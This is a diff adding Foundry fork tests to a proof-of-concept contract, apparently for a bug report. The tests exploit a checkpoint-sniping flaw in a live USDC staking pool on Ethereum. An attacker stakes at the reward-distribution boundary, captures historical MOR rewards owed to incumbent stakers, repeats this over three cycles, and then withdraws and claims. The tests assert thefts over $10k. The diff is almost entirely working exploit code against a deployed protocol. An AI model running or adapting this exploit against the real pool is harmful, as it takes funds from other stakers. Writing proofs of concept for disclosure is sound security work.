@@ -110,6 +110,13 @@ contract CheckpointSnipingPoC is Test {
         uint256 incumbentReward;
     }
 
+    struct RepeatCycleResult {
+        uint256 attackerReward;
+        uint256 incumbentLoss;
+        uint256 emissionWhileStaked;
+        uint256 nextBoundary;
+    }
+
     function setUp() public {
         vm.createSelectFork("eth", FORK_BLOCK);
     }
@@ -349,6 +356,170 @@ contract CheckpointSnipingPoC is Test {
                 _proveUSDCCollectability(distributor, boundary, attack.attackerReward, amounts[i]);
             }
         }
+    }
+
+    function test_usdcThreeCycleSameCapitalRepeatability() public {
+        uint256 amount = 10_000_000e6;
+        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
+        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
+            distributor.minRewardsDistributePeriod();
+        uint256 totalHistoricalCapture;
+        uint256 totalIncumbentLoss;
+
+        for (uint256 cycle; cycle < 3; cycle++) {
+            RepeatCycleResult memory result = _runUSDCRepeatCycle(distributor, boundary, amount);
+            totalHistoricalCapture += result.attackerReward;
+            totalIncumbentLoss += result.incumbentLoss;
+            boundary = result.nextBoundary;
+
+            emit log_named_uint("repeatability cycle", cycle + 1);
+            emit log_named_decimal_uint("cycle historical capture MOR", result.attackerReward, 18);
+            emit log_named_decimal_uint("cycle incumbent loss MOR", result.incumbentLoss, 18);
+            emit log_named_decimal_uint("cycle emission while staked MOR", result.emissionWhileStaked, 18);
+        }
+
+        emit log_named_decimal_uint("THREE-CYCLE HISTORICAL CAPTURE MOR", totalHistoricalCapture, 18);
+        emit log_named_decimal_uint("THREE-CYCLE INCUMBENT LOSS MOR", totalIncumbentLoss, 18);
+        assertGt(totalHistoricalCapture, 5_128 ether, "three-cycle capture did not exceed $10k at $1.95/MOR");
+        assertGt(totalIncumbentLoss, 5_128 ether, "three-cycle incumbent loss did not exceed $10k at $1.95/MOR");
+    }
+
+    function _runUSDCRepeatCycle(
+        IDistributorCheckpoint distributor,
+        uint256 boundary,
+        uint256 amount
+    ) private returns (RepeatCycleResult memory result) {
+        (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
+        uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
+        uint256 stateSnapshot = vm.snapshotState();
+
+        LiveBranchResult memory control =
+            _runUSDCControlAmount(distributor, boundary, initialRate, incumbentVirtualWeight, amount);
+
+        require(vm.revertToState(stateSnapshot), "repeatability snapshot revert failed");
+        LiveBranchResult memory attack = _runUSDCAttackAmount(
+            distributor,
+            boundary,
+            initialRate,
+            incumbentVirtualWeight,
+            amount,
+            boundary
+        );
+
+        result.attackerReward = attack.attackerReward;
+        result.incumbentLoss = control.incumbentReward - attack.incumbentReward;
+        result.emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
+            POOL_ID,
+            uint128(boundary),
+            uint128(boundary + NEXT_BLOCK_SECONDS)
+        );
+
+        assertEq(control.attackerReward, 0, "repeatability control got old reward");
+        assertGt(result.attackerReward, result.emissionWhileStaked, "repeatability historical capture missing");
+        assertGt(result.incumbentLoss, 0, "repeatability incumbent loss missing");
+
+        _proveUSDCCollectability(distributor, boundary, result.attackerReward, amount);
+        result.nextBoundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
+            distributor.minRewardsDistributePeriod();
+    }
+
+    function test_usdcThreeCycleFreshLockCapitalEfficiency() public {
+        uint256 amount = 1_000_000e6;
+        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
+        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
+            distributor.minRewardsDistributePeriod();
+        uint128 claimLockEnd = uint128(boundary + 365 days);
+        uint256 totalHistoricalCapture;
+        uint256 totalIncumbentLoss;
+
+        for (uint256 cycle; cycle < 3; cycle++) {
+            RepeatCycleResult memory result =
+                _runUSDCLockedRepeatCycle(distributor, boundary, amount, claimLockEnd);
+            totalHistoricalCapture += result.attackerReward;
+            totalIncumbentLoss += result.incumbentLoss;
+            boundary = result.nextBoundary;
+
+            emit log_named_uint("fresh-lock repeatability cycle", cycle + 1);
+            emit log_named_decimal_uint("fresh-lock cycle historical MOR", result.attackerReward, 18);
+            emit log_named_decimal_uint("fresh-lock cycle incumbent loss MOR", result.incumbentLoss, 18);
+        }
+
+        (,,, uint256 pendingBeforeClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
+        assertGe(pendingBeforeClaim, totalHistoricalCapture, "fresh-lock cumulative reward not preserved");
+
+        vm.warp(uint256(claimLockEnd) + 1);
+        _refreshChainlinkTimestamps(distributor);
+        vm.deal(attacker, 0.1 ether);
+        vm.prank(attacker);
+        USDC_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
+        (,,, uint256 pendingAfterClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
+        assertEq(pendingAfterClaim, 0, "fresh-lock cumulative reward not collectible");
+
+        emit log_named_decimal_uint("FRESH-LOCK THREE-CYCLE CAPTURE MOR", totalHistoricalCapture, 18);
+        emit log_named_decimal_uint("FRESH-LOCK THREE-CYCLE INCUMBENT LOSS MOR", totalIncumbentLoss, 18);
+        assertGt(totalHistoricalCapture, 5_128 ether, "fresh-lock capture did not exceed $10k at $1.95/MOR");
+        assertGt(totalIncumbentLoss, 5_128 ether, "fresh-lock loss did not exceed $10k at $1.95/MOR");
+        emit log("FRESH-LOCK CUMULATIVE CLAIM SUCCEEDED");
+    }
+
+    function _runUSDCLockedRepeatCycle(
+        IDistributorCheckpoint distributor,
+        uint256 boundary,
+        uint256 amount,
+        uint128 claimLockEnd
+    ) private returns (RepeatCycleResult memory result) {
+        (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
+        uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
+        uint256 attackerRewardBefore = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
+        uint256 stateSnapshot = vm.snapshotState();
+
+        LiveBranchResult memory control =
+            _runUSDCControlAmount(distributor, boundary, initialRate, incumbentVirtualWeight, amount);
+
+        require(vm.revertToState(stateSnapshot), "locked repeatability snapshot revert failed");
+        vm.warp(boundary);
+        uint128 checkpointBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
+        _stakeTokenWithOptions(attacker, USDC, USDC_POOL, amount, claimLockEnd, address(0));
+        assertEq(
+            distributor.rewardPoolLastCalculatedTimestamp(POOL_ID),
+            checkpointBefore,
+            "locked repeatability entry unexpectedly checkpointed"
+        );
+
+        vm.warp(boundary + NEXT_BLOCK_SECONDS);
+        _refreshChainlinkTimestamps(distributor);
+        distributor.distributeRewards(POOL_ID);
+        uint256 rate = _currentPoolRateFor(USDC_POOL, distributor);
+        result.attackerReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker) - attackerRewardBefore;
+        uint256 controlAttackerReward = control.attackerReward - attackerRewardBefore;
+        uint256 attackIncumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
+        result.incumbentLoss = control.incumbentReward - attackIncumbentReward;
+
+        assertEq(controlAttackerReward, 0, "locked repeatability control got old reward");
+        assertGt(result.attackerReward, 0, "locked historical capture missing");
+        assertGt(result.incumbentLoss, 0, "locked incumbent loss missing");
+
+        _withdrawUSDCPreservingReward(distributor, boundary, amount, result.attackerReward);
+        result.nextBoundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
+            distributor.minRewardsDistributePeriod();
+    }
+
+    function _withdrawUSDCPreservingReward(
+        IDistributorCheckpoint distributor,
+        uint256 boundary,
+        uint256 principalAmount,
+        uint256 expectedReward
+    ) private {
+        (uint128 withdrawLock,,,,) = USDC_POOL.rewardPoolsProtocolDetails(POOL_ID);
+        vm.warp(boundary + withdrawLock + 1);
+        _refreshChainlinkTimestamps(distributor);
+        uint256 principalBefore = USDC.balanceOf(attacker);
+        vm.prank(attacker);
+        USDC_POOL.withdraw(POOL_ID, type(uint256).max);
+        uint256 principalReturned = USDC.balanceOf(attacker) - principalBefore;
+        assertGe(principalReturned, principalAmount - 10, "locked repeatability principal not returned");
+        (,,, uint256 pendingAfterWithdraw,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
+        assertGe(pendingAfterWithdraw, expectedReward, "locked repeatability reward not preserved");
     }
 
     function test_usdcFreshLockAmplifierAndCollectability() public {
